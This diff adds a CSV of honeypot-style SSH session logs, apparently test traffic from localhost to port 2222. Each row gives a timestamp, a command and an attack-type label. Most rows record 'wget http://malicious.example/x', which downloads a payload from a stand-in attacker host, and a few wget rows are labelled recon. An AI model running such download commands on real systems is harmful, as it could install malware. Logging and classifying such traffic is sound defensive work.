@@ -1,0 +1,17 @@
+session_id,src_ip,src_port,timestamp,events,dst_port,instance,attack_type,src_country
+S-1762444442,127.0.0.1,50923,2025-11-06 21:24:02,uname -a,2222,default,recon,LOCAL
+S-1762444589,127.0.0.1,52051,2025-11-06 21:26:29,uname -a,2222,default,recon,LOCAL
+S-1762450397,127.0.0.1,64216,2025-11-06 23:03:17,wget http://malicious.example/x | ls -la,2222,default,exploit,LOCAL
+S-1762454985,127.0.0.1,57182,2025-11-07 00:19:46,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,exploit,LOCAL
+S-1762455958,127.0.0.1,53734,2025-11-07 00:36:00,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,exploit,LOCAL
+S-1762502340,127.0.0.1,50692,2025-11-07 13:29:02,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,exploit,LOCAL
+S-1762503072,127.0.0.1,59319,2025-11-07 13:41:14,wget http://malicious.example/x,2222,default,exploit,LOCAL
+S-1762503846,127.0.0.1,58022,2025-11-07 13:54:07,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,exploit,LOCAL
+S-1762504483,127.0.0.1,54140,2025-11-07 14:04:44,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,exploit,LOCAL
+S-1762597591,127.0.0.1,60336,2025-11-08 15:56:32,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,exploit,LOCAL
+S-1762602185,127.0.0.1,60502,2025-11-08 17:13:06,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,exploit,LOCAL
+S-1762626543,127.0.0.1,51498,2025-11-08 23:59:04,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,exploit,LOCAL
+S-1762627149,127.0.0.1,50178,2025-11-09 00:09:10,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,exploit,LOCAL
+S-1762776952,127.0.0.1,61024,2025-11-10 17:45:55,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,recon,LOCAL
+S-1762797098,127.0.0.1,57713,2025-11-10 23:21:41,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,recon,LOCAL
+S-1762797430,127.0.0.1,55184,2025-11-10 23:27:12,wget http://malicious.example/x | 🔴 CMD: ls -la,2222,default,recon,LOCAL
